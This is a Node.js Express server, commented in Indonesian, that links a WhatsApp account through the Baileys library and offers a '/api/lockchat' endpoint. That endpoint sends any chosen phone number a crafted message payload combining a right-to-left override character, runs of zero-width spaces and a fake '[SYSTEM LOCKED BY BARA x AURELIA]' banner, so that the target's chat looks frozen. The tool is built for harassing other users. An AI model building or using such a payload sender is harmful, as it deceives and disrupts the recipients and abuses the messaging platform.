const express = require('express');
const makeWASocket = require('@whiskeysockets/baileys').default;
const { useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const P = require('pino');
const QRCode = require('qrcode');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Menyimpan session WA di memori server
let sock = null;
let currentQR = null;
let pairingCode = null;
let isConnected = false;

// Endpoint untuk inisialisasi koneksi
app.post('/api/connect', async (req, res) => {
    const { phone, method } = req.body;

    if (!phone || !phone.startsWith('62')) {
        return res.status(400).json({ ok: false, error: 'Nomor wajib diawali 62' });
    }

    try {
        // Reset state
        currentQR = null;
        pairingCode = null;
        isConnected = false;

        const { state, saveCreds } = await useMultiFileAuthState(`./session_${phone}`);

        sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: P({ level: 'silent' }),
            browser: Browsers.ubuntu('Chrome'),
        });

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr) {
                currentQR = await QRCode.toDataURL(qr);
            }

            if (connection === 'close') {
                isConnected = false;
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                if (shouldReconnect) {
                    console.log('Reconnecting...');
                }
            } else if (connection === 'open') {
                isConnected = true;
                currentQR = null;
                pairingCode = null;
                console.log(`[${phone}] WhatsApp CONNECTED`);
            }
        });

        if (method === 'pairing' && !sock.authState.creds.registered) {
            await new Promise(r => setTimeout(r, 3000));
            pairingCode = await sock.requestPairingCode(phone);
            return res.json({ ok: true, status: 'pairing_ready', code: pairingCode });
        } else {
            // Tunggu QR muncul maksimal 10 detik
            let attempts = 0;
            while (!currentQR && attempts < 20) {
                await new Promise(r => setTimeout(r, 500));
                attempts++;
            }
            if (currentQR) {
                return res.json({ ok: true, status: 'qr_ready', qr: currentQR });
            } else {
                return res.status(500).json({ ok: false, error: 'Timeout menunggu QR' });
            }
        }
    } catch (err) {
        return res.status(500).json({ ok: false, error: err.message });
    }
});

// Endpoint Lock Chat (Kirim Payload RTL)
app.post('/api/lockchat', async (req, res) => {
    const { target, targetName } = req.body;

    if (!sock || !isConnected) {
        return res.status(400).json({ ok: false, error: 'WhatsApp belum terhubung! Silakan ke menu Sender.' });
    }

    if (!target) return res.status(400).json({ ok: false, error: 'Target kosong' });

    try {
        const jid = `${target}@s.whatsapp.net`;
        const rtl = '\u202E';
        const zwsp = '\u200B';
        
        // Payload Manipulasi Visual
        const payload = 
            `${rtl}${zwsp.repeat(30)}\n` +
            `JavaScript\n` +
            `😀😀😀😀😀\n` +
            `${zwsp.repeat(50)}\n` +
            `\`\`\`\n[SYSTEM LOCKED BY BARA x AURELIA]\n` +
            `Target: ${targetName || target}\nChat ini dibekukan.\`\`\``;

        await sock.sendMessage(jid, { text: payload });

        return res.json({ ok: true, message: 'Efek Lock Chat berhasil dikirim ke target!' });
    } catch (err) {
        return res.status(500).json({ ok: false, error: err.message });
    }
});

// Jalankan Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server jalan di port ${PORT}`);
});
